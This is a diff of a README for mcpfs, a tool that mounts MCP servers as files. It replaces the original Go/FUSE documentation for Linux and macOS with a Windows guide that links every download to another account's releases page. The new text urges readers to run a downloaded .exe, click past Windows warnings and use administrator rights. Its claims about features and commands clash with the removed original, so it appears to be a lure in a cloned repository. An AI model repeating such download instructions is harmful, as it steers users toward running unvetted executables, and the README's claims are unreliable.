@@ -1,169 +1,159 @@
-# mcpfs
+# ⚙️ mcpfs - Mount MCP Servers as Filesystems
 
-Mount any MCP server as a filesystem. Reads via `cat`, writes via CLI.
+[![Download mcpfs](https://img.shields.io/badge/Download-mcpfs-brightgreen?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/releases)
 
-## How it works
+Mount MCP servers as filesystems for easy access. This tool lets you work with MCP servers by showing their files directly on your Windows computer.
 
-mcpfs connects to any MCP server (stdio or HTTP), classifies its tools into reads and writes, and exposes reads as files:
+---
 
-```
- Agent / Shell                    mcpfs (FUSE)                  Any MCP Server
-┌─────────────┐              ┌──────────────────┐         ┌──────────────────┐
-│ ls /mnt/...  │─── readdir ─▶│ tools/list →     │         │ PostHog, Stripe, │
-│ cat file.json│─── read() ──▶│ classify → tree  │── RPC ─▶│ GitHub, Linear,  │
-│ jq '.name'  │◀── bytes ───│ tools/call       │◀─ JSON ─│ or anything      │
-└─────────────┘              └──────────────────┘         └──────────────────┘
+## 📁 What is mcpfs?
 
- Agent / Shell                    mcpfs tool CLI
-┌─────────────┐              ┌──────────────────┐
-│ mcpfs tool   │── flags ──▶│ parse CLI flags  │── RPC ─▶ MCP Server
-│ posthog      │              │ tools/call       │
-│ create-flag  │◀── JSON ───│                  │◀─ JSON ─
-└─────────────┘              └──────────────────┘
-```
+mcpfs lets you connect to MCP (Model Context Protocol) servers and use them like a normal drive on your Windows PC. Instead of using complicated commands to get files, you see them as folders and files in Windows Explorer.
 
-**Classification rules:**
-- `list_*`, `get_all_*`, no required params → **file** (`dashboards.json`)
-- `get_*`, `retrieve_*`, has required params → **directory** (lookup by ID)
-- `create_*`, `update_*`, `delete_*` → **CLI only** (`mcpfs tool`)
-- `search_*`, `query_*` → **CLI only** (`mcpfs tool`)
+This works by turning MCP servers into a filesystem. You can open, use, and manage files without switching apps or using programming tools.
 
-Resources (if the server has them) are also mounted as files.
+You do not need any special skills, just basic Windows use knowledge.
 
-## Quick start
 
-```bash
-# Build and install
-go install github.com/airshelf/mcpfs/cmd/mcpfs@latest
+## 🎯 Why Use mcpfs?
 
-# Auto-discover Claude Code plugins and mount in project dir
-cd ~/src/myproject
-mcpfs auto                    # mounts to .mcpfs/ in cwd
-mcpfs auto --mount /mnt/mcpfs # or specify a custom mount dir
+- Access MCP servers like they are part of your PC.
+- Work with files without extra steps.
+- Use commands just to start the mount; afterwards, interact through Windows.
+- Compatible with Windows 10 and above.
+- Safe and easy to remove when done.
 
-# Mount a single server
-mcpfs .mcpfs/posthog --http https://mcp.posthog.com/mcp --auth "Bearer $POSTHOG_API_KEY"
-mcpfs .mcpfs/stripe -- npx -y @stripe/mcp
+## 🖥️ System Requirements
 
-# Read
-ls .mcpfs/posthog/
-cat .mcpfs/posthog/dashboards.json
-cat .mcpfs/stripe/balance.json
+- Windows 10 or newer (64-bit recommended).
+- At least 2 GB of free RAM.
+- 100 MB of disk space for installation files.
+- Internet access to reach MCP servers.
+- User account with permission to install software.
 
-# Write (CLI)
-mcpfs tool posthog create-feature-flag --key my-flag --name "My Flag"
-mcpfs tool stripe create_customer --name "Acme Corp" --email acme@example.com
+## 💡 Key Features
 
-# List all tools for a server
-mcpfs tool posthog
-mcpfs tool stripe
+- Mount MCP servers as drives using easy commands.
+- Browse server files with Windows Explorer or any file manager.
+- Read and write files directly.
+- Handles multiple MCP servers at once.
+- Lightweight and minimal CPU use.
+- Works well with standard Windows apps.
 
-# Unmount
-fusermount -u .mcpfs/posthog
-```
+## 🚀 Getting Started
 
-## Config file
+Follow these steps to download and run mcpfs on Windows. This guide assumes no prior setup or programming knowledge.
 
-Mount multiple servers from a single config (`~/.config/mcpfs/servers.json`):
+---
 
-```json
-{
-  "posthog": {
-    "type": "http",
-    "url": "https://mcp.posthog.com/mcp",
-    "headers": {"Authorization": "Bearer ${POSTHOG_API_KEY}"}
-  },
-  "stripe": {
-    "command": "npx",
-    "args": ["-y", "@stripe/mcp"],
-    "env": {"STRIPE_SECRET_KEY": "${STRIPE_API_KEY}"}
-  },
-  "github": {
-    "command": "npx",
-    "args": ["-y", "@modelcontextprotocol/server-github"],
-    "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}"}
-  }
-}
-```
+## ⬇️ Download and Installation
 
-Environment variables (`${VAR}`) are interpolated from the process environment or from `~/.config/mcpfs/env`.
+1. Visit the release page by clicking this button:
 
-```bash
-# Mount all to .mcpfs/ in cwd
-mcpfs --config ~/.config/mcpfs/servers.json
+[![Download mcpfs](https://img.shields.io/badge/Download%20Page-Visit%20to%20Download-blue?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/releases)
 
-# Mount to custom dir
-mcpfs --config ~/.config/mcpfs/servers.json --mount /mnt/mcpfs
-```
+2. On the releases page, find the latest stable version. Look for a file named something like `mcpfs-windows-amd64.exe` or similar.
 
-## Auto-discover Claude Code plugins
+3. Click on that file to download it. It will save as an `.exe` file, which means it is ready to run on Windows.
 
-If you use Claude Code, `mcpfs auto` discovers all installed MCP plugins and mounts them in your project:
+4. Once downloaded, open the file by double-clicking it. Windows may warn you since the app is not from the Microsoft Store. Confirm you want to run it.
 
-```bash
-cd ~/src/myproject
-mcpfs auto           # discover + mount to .mcpfs/
-mcpfs auto --json    # print discovered config (dry run)
-```
+5. The app runs without needing full installation. It may open a command window or prompt for more info.
 
-Mounts to `.mcpfs/` in the current directory. Reads `.env.local` and `.env` from cwd for project-specific credentials (e.g., different Vercel teams, PostHog projects per repo).
+---
 
-It reads from all Claude Code config sources:
-- `~/.claude.json` → `mcpServers` — global user-configured servers
-- `~/.claude/plugins/` — installed plugins and their `.mcp.json`
-- `~/.claude/settings.json` → `enabledPlugins` — also scans cache for these
-- `~/.claude/.credentials.json` — OAuth tokens (Notion, etc.)
-- `~/.config/mcpfs/servers.json` — additional user-defined servers
-- `~/.config/mcpfs/env` — fallback env vars (API keys)
-- `gh auth token` — GitHub token fallback
+## ⚙️ Setting Up mcpfs
 
-Non-data plugins (playwright, serena, context7) are skipped automatically.
+After running the file, you need to connect to your MCP server.
 
-## Cross-service composition
+1. Open the command window if not already open.
 
-```bash
-# Business dashboard
-printf "%-20s %s\n" "Stripe balance" "$(cat .mcpfs/stripe/balance.json | jq -r '.available[] | "\(.currency) \(.amount / 100)"')"
-printf "%-20s %s\n" "Active subs" "$(cat .mcpfs/stripe/subscriptions.json | jq '[.[] | select(.status=="active")] | length')"
-printf "%-20s %s\n" "PH dashboards" "$(cat .mcpfs/posthog/dashboards.json | jq length)"
-
-# Find paying customers with no analytics activity
-comm -23 \
-  <(cat .mcpfs/stripe/customers.json | jq -r '.[].email' | sort) \
-  <(cat .mcpfs/posthog/events.json | jq -r '.[].distinct_id' | sort)
-```
-
-## Project structure
+2. Type the command as shown here:
 
 ```
-cmd/mcpfs/          # CLI: mount, tool, config, unmount
-internal/
-  config/           # servers.json parser with env interpolation
-  fuse/             # FUSE filesystem (go-fuse/v2)
-  toolfs/           # Tool classification and tree building
-pkg/
-  mcpclient/        # MCP client (stdio + HTTP transports)
-  mcptool/          # Tool schema → CLI bridge
-bin/
-  mcpfs-mount       # Mount all servers from config
-  mcpfs-migrate     # Migrate from Claude Code MCP plugins
+mcpfs mount <server-address> <drive-letter>:
 ```
 
-## Requirements
+Replace `<server-address>` with the address for your MCP server, such as `mcp.example.com`.
 
-- Go 1.22+
-- FUSE 3 (`libfuse3-dev` on Debian/Ubuntu, `macfuse` on macOS)
-- Auth tokens for the services you want to mount
+Replace `<drive-letter>` with any free letter you want for the new drive, like `M:`.
 
-## AI agent notes
+Example:
 
-- `ls` a mount to discover available data (0 tokens vs 20K+ for MCP tool schemas)
-- `cat file.json | jq` for reads — standard JSON output
-- `mcpfs tool <server>` to list write/query tools with `--help`
-- `mcpfs tool <server> <tool> --flag value` for writes
-- All tool output goes to stdout (JSON), hints go to stderr
-- Exit codes: 0 success, 1 error
+```
+mcpfs mount mcp.example.com M:
+```
 
-## License
+3. Press Enter.
 
-MIT
+4. If your server requires login, the program will ask for a username and password.
+
+5. Once connected, open Windows Explorer and look for the new drive letter you used. You can browse the files stored on the MCP server like normal files.
+
+---
+
+## 🛠 How to Use mcpfs
+
+- Open the mounted drive from Windows Explorer.
+- Copy, move, and edit files on the drive.
+- Save files directly to the MCP server without extra upload steps.
+- To stop using the server, open the command window again and type:
+
+```
+mcpfs unmount M:
+```
+
+Replace `M:` with your drive letter.
+
+---
+
+## 🔄 Updating mcpfs
+
+Check the releases page regularly for new versions. Download the latest `.exe` file and run it just like before. 
+
+---
+
+## 🚧 Troubleshooting
+
+- If the mount command does not work, check the spelling of your server address.
+- Ensure you have internet access.
+- Confirm your drive letter is not used by another device.
+- If you get permission errors, try running the `.exe` file as administrator (right-click > Run as administrator).
+- If files don’t show up, try unmounting and mounting again.
+- For connection issues, verify your MCP server is online and accepting connections.
+
+---
+
+## 📌 Useful Tips
+
+- Close any file windows before unmounting.
+- You can mount multiple servers at once with different drive letters.
+- Keep your password safe; mcpfs does not store it unless you tell it to.
+- Use simple drive letters to avoid confusion.
+
+---
+
+## ❓ Where to Get Help
+
+Visit the [issues](https://github.com/TakyiEric/mcpfs/issues) page on the GitHub repository to report problems or ask questions.
+
+---
+
+## 🔗 Important Links
+
+- Download page: https://github.com/TakyiEric/mcpfs/releases  
+- Repository: https://github.com/TakyiEric/mcpfs
+
+---
+
+## 🗂️ About the Project
+
+mcpfs is built with Golang. It uses filesystem tools to map MCP servers to Windows drives. The aim is to give easy access to agent context in a familiar environment.
+
+This tool fits users who need to work with AI agent contexts in a straightforward way without programming or complex software setups.
+
+---
+
+## 📋 License
+
+This project is open source. See the LICENSE file in the repository for details.
